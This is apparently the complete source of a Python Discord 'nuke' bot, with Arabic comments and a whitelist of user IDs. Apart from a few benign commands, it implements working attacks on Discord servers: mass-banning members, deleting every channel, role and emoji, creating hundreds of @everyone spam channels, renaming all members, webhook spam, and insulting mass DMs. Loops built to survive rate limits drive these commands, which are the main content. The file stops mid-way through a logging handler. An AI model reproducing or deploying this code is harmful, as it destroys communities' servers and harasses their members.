import discord
from discord import app_commands
import asyncio
import random
import warnings
warnings.filterwarnings("ignore")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

# ===============================
# قائمة الـ IDs المسموح لهم فقط باستخدام البوت
# ===============================
allowed_users = {
    1462462741091586102,
    1517162448099082325,
    1517941657352536075,
    1481064601687822396,
    1331615845407002697, 
    1261097811890540619,
    1257036373970522233,
    1274794363301658656,
    1387805990933495908,
    605166970098417677,
    1469237407210803284,
    1370798402006421634,
    875469732663423046,
    1192861045425963010
}

# ===============================
# قائمة الـ IDs الممنوعين تمامًا
# ===============================
banned_users = {
    1348047167926833152,
}

async def is_allowed(interaction: discord.Interaction) -> bool:
    user_id = interaction.user.id
    
    if user_id in banned_users:
        try:
            await interaction.response.send_message(
                "انت غير مسموح لك باستخدام البوت ❌\n(انطر ابلكاش)",
                ephemeral=True
            )
        except:
            pass
        return False
    
    if user_id not in allowed_users:
        try:
            await interaction.response.send_message(
                "انت غير مسموح لك باستخدام البوت ❌\n(انطر ابلكاش)",
                ephemeral=True
            )
        except:
            pass
        return False
    
    return True

tree.interaction_check = is_allowed

# ===============================
# دالة تقسيم الرسائل الطويلة
# ===============================
def split_message(text, limit=2000):
    return [text[i:i + limit] for i in range(0, len(text), limit)]

# ===============================
# متغير لتخزين آخر رسالة في /spam2
# ===============================
last_spam2_message = None

# =====================================================
# ================== PING =============================
# =====================================================
@tree.command(name="ping", description="اختبار استجابة البوت")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"🏓 Pong! {round(client.latency * 1000)}ms", ephemeral=True)

# =====================================================
# ================== AVATAR ===========================
# =====================================================
@tree.command(name="avatar", description="عرض صورة الشخص")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def avatar(interaction: discord.Interaction, member: discord.User = None):
    member = member or interaction.user
    embed = discord.Embed(
        title=f"🖼️ Avatar {member}",
        color=discord.Color.blue()
    )
    embed.set_image(url=member.display_avatar.url)
    await interaction.response.send_message(embed=embed)

# ===============================
# ======== نظام /say ============
# ===============================
class SayModal(discord.ui.Modal, title="Say Something"):
    message = discord.ui.TextInput(
        label="اكتب رسالتك هنا",
        style=discord.TextStyle.paragraph,
        required=True,
        max_length=2000
    )
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(
            self.message.value,
            ephemeral=False
        )

class SayButton(discord.ui.View):
    @discord.ui.button(label="say", style=discord.ButtonStyle.primary)
    async def say_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SayModal())

@tree.command(name="say", description="(اكتب رساله)")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def say(interaction: discord.Interaction):
    await interaction.response.send_message(
        "اضغط الزر واكتب رسالتك",
        view=SayButton(),
        ephemeral=True
    )

# ===============================
# ======== نظام /bom ============
# ===============================
class BomButton(discord.ui.View):
    @discord.ui.button(label="bom", style=discord.ButtonStyle.danger)
    async def bom_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        message = "." + "\n" * 1998 + "."
        await interaction.followup.send(message, ephemeral=False)

@tree.command(name="bom", description="زر التخريب")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def bom(interaction: discord.Interaction):
    await interaction.response.send_message(
        "اضغط bom",
        view=BomButton(),
        ephemeral=True
    )

# ===============================
# ======== نظام /spam ===========
# ===============================
class SpamExButton(discord.ui.View):
    @discord.ui.button(label="spam _EXE_🍑🔥🥒🤤", style=discord.ButtonStyle.danger)
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        long_spam = "_EXE_🔥🍑🥒🤤" * 400
        for _ in range(5):
            for part in split_message(long_spam):
                await interaction.followup.send(part, ephemeral=False)
                await asyncio.sleep(1.5)

@tree.command(name="spam", description="زر spam EX")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def spam(interaction: discord.Interaction):
    await interaction.response.send_message(
        "اضغط spam _EXE_🍑🔥🥒🤤",
        view=SpamExButton(),
        ephemeral=True
    )

# ===============================
# ======== نظام /spam2 ===========
# ===============================
class Spam2Modal(discord.ui.Modal, title="Spam 2"):
    message = discord.ui.TextInput(
        label="اكتب الرسالة هنا",
        style=discord.TextStyle.paragraph,
        required=True,
        max_length=2000
    )
    async def on_submit(self, interaction: discord.Interaction):
        global last_spam2_message
        last_spam2_message = self.message.value
        await interaction.response.defer()
        for _ in range(5):
            await interaction.followup.send(last_spam2_message, ephemeral=False)
            await asyncio.sleep(1.5)

class Spam2Button(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.sent_once = False

    @discord.ui.button(label="spam2", style=discord.ButtonStyle.success)
    async def spam2_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        global last_spam2_message
        if last_spam2_message is None or not self.sent_once:
            await interaction.response.send_modal(Spam2Modal())
            self.sent_once = True
        else:
            await interaction.response.defer()
            for _ in range(5):
                await interaction.followup.send(last_spam2_message, ephemeral=False)
                await asyncio.sleep(1.5)

@tree.command(name="spam2", description="(اكتب الرساله وسيتم السبام)")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def spam2(interaction: discord.Interaction):
    await interaction.response.send_message(
        "اكتب رسالتك واطغط spam2 وسيتم السبام",
        view=Spam2Button(),
        ephemeral=True
    )

# ===============================
# ======== نظام /gif ===========
# ===============================
class GifButton(discord.ui.View):
    def __init__(self, gif_link: str):
        super().__init__()
        self.gif_link = gif_link

    @discord.ui.button(label="start gif", style=discord.ButtonStyle.success)
    async def start_gif(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        for _ in range(5):
            await interaction.followup.send(self.gif_link, ephemeral=False)
            await asyncio.sleep(1.5)

@tree.command(name="gif", description="سبام gif")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def gif(interaction: discord.Interaction, لينك_ال_gif: str):
    embed = discord.Embed(
        title="رابط gif",
        description=f"↓\n{لينك_ال_gif}",
        color=discord.Color.purple()
    )
    await interaction.response.send_message(
        "اطغط start gif وسيتم بدأ السبام",
        embed=embed,
        view=GifButton(لينك_ال_gif),
        ephemeral=True
    )

# ===============================
# ======== /serverinfo ==========
# ===============================
@tree.command(name="serverinfo", description="عرض معلومات السيرفر (لك فقط)")
@app_commands.allowed_installs(guilds=True)
@app_commands.allowed_contexts(guilds=True)
async def serverinfo(interaction: discord.Interaction):
    if interaction.guild is None:
        await interaction.response.send_message("❌ هذا الأمر يعمل فقط داخل السيرفرات!", ephemeral=True)
        return
    guild = interaction.guild
    embed = discord.Embed(
        title=f"📊 معلومات السيرفر: {guild.name}",
        color=discord.Color.gold()
    )
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.add_field(name="👥 عدد الأعضاء", value=f"`{guild.member_count}`", inline=True)
    embed.add_field(name="📁 عدد الرومات", value=f"`{len(guild.channels)}`", inline=True)
    embed.add_field(name="🆔 ID السيرفر", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="📅 متى نشأ", value=guild.created_at.strftime("**%d/%m/%Y** | **%H:%M**"), inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ===============================
# ======== /userinfo ============
# ===============================
@tree.command(name="userinfo", description="عرض معلومات مستخدم")
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def userinfo(interaction: discord.Interaction, member: discord.User = None):
    member = member or interaction.user
    embed = discord.Embed(
        title="👤 معلومات المستخدم",
        description=f"**{member}**",
        color=discord.Color.purple()
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="📛 الاسم", value=member.display_name, inline=True)
    embed.add_field(name="🏷️ اسم اليوزر", value=f"`@{member.name}`", inline=True)
    embed.add_field(name="🆔 الـ ID", value=f"`{member.id}`", inline=True)
    embed.add_field(name="📅 متى نشأ الحساب", value=member.created_at.strftime("**%d/%m/%Y** | **%H:%M**"), inline=False)
    await interaction.response.send_message(embed=embed)

# ===============================
# أمر /banall (معدل السرعة)
# ===============================
@tree.command(
    name="banall",
    description="حظر (بان) كل الأعضاء ما عدا اللي نفذ الأمر والبوت"
)
@app_commands.allowed_contexts(guilds=True)
async def ban_all(interaction: discord.Interaction):
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("الأمر ده في السيرفرات بس", ephemeral=True)
        return
    executor = interaction.user
    if not guild.me.guild_permissions.ban_members:
        await interaction.response.send_message("البوت مش عنده صلاحية **Ban Members**", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    banned_count = 0
    failed_count = 0
    members_to_ban = [
        member for member in guild.members
        if member.id != executor.id
        and member.id != client.user.id
        and not member.bot
    ]
    if not members_to_ban:
        await interaction.followup.send("مفيش أعضاء ينفع نحظرهم", ephemeral=True)
        return
    await interaction.followup.send("يتم الحظر...", ephemeral=True)
    for member in members_to_ban:
        try:
            await guild.ban(member, reason="Mass ban by admin")
            banned_count += 1
            await asyncio.sleep(1.5)
        except discord.Forbidden:
            failed_count += 1
        except discord.HTTPException as e:
            failed_count += 1
            if "rate limit" in str(e).lower():
                await asyncio.sleep(6)
        except Exception:
            failed_count += 1
    await interaction.followup.send(
        f"**انتهى الباند**\n\n"
        f"تم حظر: **{banned_count}** عضو\n"
        f"فشل في الحظر: **{failed_count}** عضو",
        ephemeral=True
    )

# ===============================
# الأمر /channels (معدل السرعة)
# ===============================
@tree.command(
    name="channels",
    description="انشاء رومات وحذف رولات (لازم بوت يكون عنده صلاحيه ادمن ستريتر )"
)
@app_commands.allowed_contexts(guilds=True)
async def create_channels(interaction: discord.Interaction):
    guild = interaction.guild
    current_channel = interaction.channel
    if not guild:
        await interaction.response.send_message("يشتغل في السيرفرات بس", ephemeral=True)
        return
    if not guild.me.guild_permissions.manage_channels:
        await interaction.response.send_message("البوت مش عنده صلاحية **Manage Channels**", ephemeral=True)
        return
    if not guild.me.guild_permissions.manage_roles:
        await interaction.response.send_message("البوت مش عنده صلاحية **Manage Roles**", ephemeral=True)
        return
    if not guild.me.guild_permissions.mention_everyone:
        await interaction.followup.send("البوت مش عنده صلاحية **Mention @everyone**", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    bot_member = guild.get_member(client.user.id)
    bot_roles = set(bot_member.roles)
    channels_deleted = 0
    channels_failed = 0
    await interaction.followup.send("جاري حذف **كل** القنوات ما عدا الشات ده...", ephemeral=True)
    for channel in guild.channels:
        if channel.id == current_channel.id:
            continue
        try:
            await channel.delete(reason="Mass channel delete - keep command channel")
            channels_deleted += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            channels_failed += 1
            print(f"فشل حذف قناة {channel.name}: {e}")
    roles_deleted = 0
    roles_failed = 0
    await interaction.followup.send(f"تم حذف {channels_deleted} قناة (فشل {channels_failed})\nجاري حذف كل الرولات...", ephemeral=True)
    for role in guild.roles:
        if role in bot_roles:
            continue
        try:
            await role.delete(reason="Mass role delete - keep bot roles only")
            roles_deleted += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            roles_failed += 1
            print(f"فشل حذف رول {role.name}: {e}")
    created = 0
    failed = 0
    messages_sent = 0
    await interaction.followup.send(f"تم حذف {roles_deleted} رول (فشل {roles_failed})\nجاري إنشاء 150 روم...", ephemeral=True)
    spam_text = (
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "# ExE_tOp :sparkling_heart::pleading_face:☝\n"
        "@everyone @here"
    )
    for i in range(1, 151):
        try:
            channel = await guild.create_text_channel(name="EXE the KIng")
            created += 1
            try:
                await channel.send(spam_text)
                messages_sent += 1
            except:
                pass
            await asyncio.sleep(0.5)
        except discord.HTTPException as e:
            failed += 1
            if e.status == 429:
                retry_after = getattr(e, 'retry_after', 5)
                await asyncio.sleep(retry_after + 2)
            if e.code in (30001, 50035):
                break
        except Exception as e:
            failed += 1
    await interaction.followup.send(
        f"**تم الانتهاء !**\n\n"
        f"حُذفت: **{channels_deleted}** قناة + **{roles_deleted}** رول\n"
        f"أُنشئت: **{created}** قناة نصية باسم **EXE the KIng**\n"
        f"تم إرسال الرسالة في: **{messages_sent}** روم\n"
        f"فشل: **{channels_failed + roles_failed + failed}**\n\n"
        "💀☝",
        ephemeral=True
    )

# ===============================
# الأمر /nuke (معدل السرعة)
# ===============================
@tree.command(
    name="nuke",
    description="تدمير السيرفر كامل مع الحفاظ على الروم الحالي"
)
@app_commands.allowed_contexts(guilds=True)
async def nuke(interaction: discord.Interaction):
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("الأمر ده في السيرفرات بس", ephemeral=True)
        return
    if not guild.me.guild_permissions.administrator:
        await interaction.response.send_message("البوت لازم يكون عنده صلاحية **Administrator** عشان ينفذ /nuke", ephemeral=True)
        return
    current_channel = interaction.channel
    await interaction.response.defer(ephemeral=True)
    await interaction.followup.send("يتم NUKE", ephemeral=True)
    try:
        await guild.edit(name="🔥 EXE IS OWNER🤐", icon=None)
    except:
        pass
    for channel in guild.channels:
        if channel.id == current_channel.id:
            continue
        try:
            await channel.delete(reason="Nuke - Mass delete (keep command channel)")
            await asyncio.sleep(0.5)
        except:
            pass
    bot_roles = set(guild.get_member(client.user.id).roles)
    for role in guild.roles:
        if role in bot_roles or role.is_default():
            continue
        try:
            await role.delete(reason="Nuke - Mass role delete")
            await asyncio.sleep(0.5)
        except:
            pass
    for emoji in guild.emojis:
        try:
            await emoji.delete(reason="Nuke - Delete emojis")
        except:
            pass
    executor = interaction.user
    banned_count = 0
    for member in guild.members:
        if member.id == executor.id or member.id == client.user.id:
            continue
        try:
            await guild.ban(member, reason="Nuke - Mass ban")
            banned_count += 1
            await asyncio.sleep(0.5)
        except:
            pass
    await interaction.followup.send(
        f"**تمت NUKE**\n"
        f"تم حظر **{banned_count}** عضو\n"
        f"السيرفر تم تدمير السيرفر",
        ephemeral=True
    )

# ===============================
# الأمر /raid (معدل السرعة)
# ===============================
@tree.command(
    name="raid",
    description="يعمل raid قوي (400 قناة + سبام @everyone في كل قناة)"
)
@app_commands.allowed_contexts(guilds=True)
async def raid(interaction: discord.Interaction):
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("الأمر ده في السيرفرات بس", ephemeral=True)
        return
    if not guild.me.guild_permissions.manage_channels:
        await interaction.response.send_message("البوت مش عنده صلاحية **Manage Channels**", ephemeral=True)
        return
    if not guild.me.guild_permissions.mention_everyone:
        await interaction.followup.send("البوت مش عنده صلاحية **Mention @everyone**", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    await interaction.followup.send("بدء عملية **RAID**... جاري إنشاء 400 قناة + سبام", ephemeral=True)
    raid_text = "😆📷ExE Is OwNeR\n@everyone @here"
    created = 0
    messages = 0
    for i in range(1, 401):
        try:
            channel = await guild.create_text_channel(name="🔥 EXE IS OWNER🤐")
            created += 1
            try:
                await channel.send(raid_text)
                messages += 1
            except:
                pass
            await asyncio.sleep(0.5)
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(5)
            if created > 350:
                break
    await interaction.followup.send(
        f"**RAID COMPLETED**\n\n"
        f"تم إنشاء **{created}** قناة\n"
        f"تم إرسال السبام في **{messages}** قناة\n\n"
        "💀☝",
        ephemeral=True
    )

# ===============================
# الأمر /rename-all (معدل السرعة)
# ===============================
@tree.command(
    name="rename-all",
    description="يغير أسماء كل الأعضاء في السيرفر إلى نص مخيف (لازم صلاحية Manage Nicknames)"
)
@app_commands.allowed_contexts(guilds=True)
async def rename_all(interaction: discord.Interaction):
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("الأمر ده في السيرفرات بس", ephemeral=True)
        return
    if not guild.me.guild_permissions.manage_nicknames:
        await interaction.response.send_message("البوت مش عنده صلاحية **Manage Nicknames**", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    await interaction.followup.send("بدء تغيير أسماء **كل** الأعضاء... جاري التنفيذ", ephemeral=True)
    new_nick = "🔥 EXE IS OWNER🤐"
    changed = 0
    for member in guild.members:
        if member.id == client.user.id:
            continue
        try:
            await member.edit(nick=new_nick)
            changed += 1
            await asyncio.sleep(0.5)
        except:
            pass
    await interaction.followup.send(
        f"**RENAME-ALL COMPLETED**\n\n"
        f"تم تغيير أسماء **{changed}** عضو\n"
        f"الكل دلوقتي اسمه: 🔥 EXE IS OWNER🤐\n\n"
        "💀☝",
        ephemeral=True
    )

# ===============================
# الأمر /webspam (معدل السرعة)
# ===============================
@tree.command(
    name="webspam",
    description="ينشئ webhooks كتير ويسبام منها كلهم مع بعض"
)
@app_commands.describe(
    webhooks_count="عدد الـ webhooks (1–8 تقريبًا)",
    messages_per_webhook="عدد الرسائل من كل webhook (1–5 تقريبًا)"
)
async def webspam(interaction: discord.Interaction, webhooks_count: int = 5, messages_per_webhook: int = 3):
    if not interaction.guild:
        return await interaction.response.send_message("الأمر ده في السيرفرات بس", ephemeral=True)

    if not interaction.guild.me.guild_permissions.manage_webhooks:
        return await interaction.response.send_message("البوت مش عنده صلاحية **Manage Webhooks**", ephemeral=True)

    webhooks_count = max(1, min(webhooks_count, 8))
    messages_per_webhook = max(1, min(messages_per_webhook, 5))

    await interaction.response.defer(ephemeral=True)

    channel = interaction.channel
    spam_message = "EXE TOP @everyone @here"

    webhook_names = [
        "exe top", "exe king", "exe owner", "exe her",
        "EXE IS HERE", "EXE RULEZ", "EXE DOMINATES", "EXE WAS HERE",
        "exe owns u", "exe top forever", "exe king 2025"
    ]

    webhooks = []
    created = 0

    for i in range(webhooks_count):
        name = random.choice(webhook_names) + f" {i+1}"
        try:
            webhook = await channel.create_webhook(name=name)
            webhooks.append((webhook, name.upper()))
            created += 1
            await asyncio.sleep(1.0)
        except Exception as e:
            print(f"فشل إنشاء webhook {i+1}: {e}")
            continue

    async def spam_from_webhook(webhook, display_name):
        nonlocal sent
        for _ in range(messages_per_webhook):
            try:
                await webhook.send(
                    content=spam_message,
                    username=display_name,
                )
                sent += 1
                await asyncio.sleep(1.5)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after + 1)
                break
            except Exception as e:
                print(f"خطأ أثناء الإرسال: {e}")
                break

    sent = 0
    try:
        tasks = [spam_from_webhook(webhook, name) for webhook, name in webhooks]
        await asyncio.gather(*tasks, return_exceptions=True)
    except Exception as e:
        print(f"خطأ عام في webspam: {e}")

    await interaction.followup.send(
        f"**Webhook Spam خلّص – كلهم مع بعض**\n\n"
        f"تم إنشاء: **{created}** webhook\n"
        f"تم إرسال تقريبًا: **{sent}** رسالة\n"
        f"في القناة: {channel.mention}\n\n"
        "لو السبام اتقطع أو مش كتير → rate limit أو اكتشاف سريع\n"
        "💀 استخدم بحذر شديد",
        ephemeral=True
    )

# ===============================
# الأمر /sendto (معدل السرعة)
# ===============================
@tree.command(
    name="sendto",
    description="يرسل رسالة في الخاص لكل أعضاء السيرفر مرة واحدة"
)
@app_commands.allowed_contexts(guilds=True)
async def sendto(interaction: discord.Interaction):
    if not interaction.guild:
        return await interaction.response.send_message("الأمر ده في السيرفرات بس", ephemeral=True)

    await interaction.response.defer(ephemeral=True)

    guild = interaction.guild
    server_name = guild.name
    message_content = f"""تم نكح سيرفر {server_name}
You are nothing
☝🥺"""

    sent_count = 0
    failed_count = 0

    members = [m for m in guild.members if not m.bot and m != client.user]

    await interaction.followup.send(f"جاري إرسال في الخاص لـ **{len(members)}** عضو...", ephemeral=True)

    async def send_dm(member):
        nonlocal sent_count, failed_count
        try:
            await member.send(message_content)
            sent_count += 1
            await asyncio.sleep(3.0)
        except discord.Forbidden:
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after + 5)
            failed_count += 1
        except Exception as e:
            print(f"خطأ في إرسال لـ {member}: {e}")
            failed_count += 1

    tasks = [send_dm(member) for member in members]
    await asyncio.gather(*tasks, return_exceptions=True)

    await interaction.followup.send(
        f"**انتهى إرسال الرسائل في الخاص**\n\n"
        f"تم الإرسال بنجاح لـ: **{sent_count}** عضو\n"
        f"فشل الإرسال لـ: **{failed_count}** عضو (غالباً DM مغلق أو rate limit)\n\n"
        "⚠️ لو السيرفر كبير واتقطع → ديسكورد بيحد من الـ mass DM",
        ephemeral=True
    )

# ===============================
# ======== نظام /spamdamge (معدل السرعة) ============
# ===============================

SPAM_DAMGE_TEXT = """🔥 𝐄𝐗𝐄 𝐈𝐒 𝐎𝐍-𝐓𝐎𝐏 🔥

👑 𝐊𝐈𝐍𝐆 𝐎𝐅 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 👑

💀 𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓𝐇𝐈𝐍𝐆 💀

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█  ███████╗██╗  ██╗███████╗    ██╗███████╗  █
█  ██╔════╝╚██╗██╔╝██╔════╝    ██║██╔════╝  █
█  █████╗   ╚███╔╝ █████╗      ██║███████╗  █
█  ██╔══╝   ██╔██╗ ██╔══╝      ██║╚════██║  █
█  ███████╗██╔╝ ██╗███████╗    ██║███████║  █
█  ╚══════╝╚═╝  ╚═╝╚══════╝    ╚═╝╚══════╝  █
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║║𝐄𝐗║
╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝

🚀 𝐄𝐗𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 🚀

🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐃 🎯

🏴‍☠️ 𝐖𝐄 𝐎𝐖𝐍 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑 🏴‍☠️

💀 𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓𝐇𝐈𝐍𝐆 💀

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔥 𝐄𝐗𝐄 🔥 𝐄𝐗𝐄 🔥 𝐄𝐗𝐄 🔥

👑 𝐖𝐄 𝐀𝐑𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆𝐒 👑

🎭 𝐄𝐗𝐄 𝐓𝐎𝐏 🎭

🏆 𝐄𝐗𝐄 𝐖𝐈𝐍𝐒 🏆

🚀 𝐄𝐗𝐄 𝐎𝐖𝐍𝐒 𝐄𝐕𝐄𝐑𝐘𝐓𝐇𝐈𝐍𝐆 🚀

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"𝐖𝐄 𝐀𝐑𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆𝐒, 𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓𝐇𝐈𝐍𝐆"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•
•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•
•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•

🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭
🎭  𝐄𝐗𝐄  🎭  𝐄𝐗𝐄  🎭  𝐄𝐗𝐄  🎭  𝐄𝐗𝐄  🎭
🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭

✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦

🔥 𝐄𝐗𝐄 𝐈𝐒 𝐎𝐍-𝐓𝐎𝐏 🔥

👑 𝐊𝐈𝐍𝐆 𝐎𝐅 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 👑

💀 𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓𝐇𝐈𝐍𝐆 💀

🚀 𝐄𝐗𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 🚀

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️
☠️  𝐄𝐗𝐄  ☠️  𝐄𝐗𝐄  ☠️  𝐄𝐗𝐄  ☠️  𝐄𝐗𝐄  ☠️
☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️

🔥 𝐄𝐗𝐄 𝐓𝐎𝐏 🔥

💀 𝐃𝐄𝐀𝐓𝐇 𝐓𝐎 𝐀𝐋𝐋 💀

👑 𝐄𝐗𝐄 𝐊𝐈𝐍𝐆 👑

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🏴‍☠️ 𝐄𝐗𝐄 𝐏𝐈𝐑𝐀𝐓𝐄𝐒 🏴‍☠️

☠️ 𝐖𝐄 𝐓𝐀𝐊𝐄 𝐖𝐇𝐀𝐓 𝐖𝐄 𝐖𝐀𝐍𝐓 ☠️

🔥 𝐄𝐗𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
💀  𝐄𝐗𝐄  💀  𝐄𝐗𝐄  💀  𝐄𝐗𝐄  💀  𝐄𝐗𝐄  💀
💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀

🔥 𝐄𝐗𝐄 𝐈𝐒 𝐎𝐍-𝐓𝐎𝐏 🔥

👑 𝐊𝐈𝐍𝐆 𝐎𝐅 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 👑

💀 𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓𝐇𝐈𝐍𝐆 💀

🚀 𝐄𝐗𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 🚀

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

class SpamDamgeConfirmView(discord.ui.View):
    def __init__(self, interaction: discord.Interaction):
        super().__init__()
        self.interaction = interaction

    @discord.ui.button(label="✅ تأكيد", style=discord.ButtonStyle.success)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="✅ تم التأكيد! جاري الإرسال...", view=self)
        
        for i in range(5):
            await interaction.channel.send(SPAM_DAMGE_TEXT)
            await asyncio.sleep(1.5)
        
        await interaction.followup.send("✅ تم إرسال السبام 5 مرات!", ephemeral=True)

    @discord.ui.button(label="❌ إلغاء", style=discord.ButtonStyle.danger)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="❌ تم الإلغاء", view=self)

@tree.command(
    name="spamdamge",
    description="💀 إرسال سبام تخريبي 5 مرات (زر تأكيد)"
)
@app_commands.allowed_installs(users=True, guilds=True)
@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
async def spamdamge(interaction: discord.Interaction):
    view = SpamDamgeConfirmView(interaction)
    await interaction.response.send_message(
        "⚠️ **تحذير:** هذا الأمر سيرسل سبام طويل 5 مرات!\n"
        "هل أنت متأكد من رغبتك في الاستمرار؟",
        view=view,
        ephemeral=True
    )

# ===============================
# ========= نظام التسجيل في الترمينال =========
# ===============================
@client.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.application_command and interaction.command:
        command_name = interaction.command.name
        user = interaction.user
        guild_name = interaction.guild.name if interaction.guild else "DM"
        time = interaction.created_at.strftime("%d/%m/%Y %H:%M:%S")
        print("\n" + "═" * 70)
        print(f"🚀 [{time}] 📌 {user} ({user.id})")
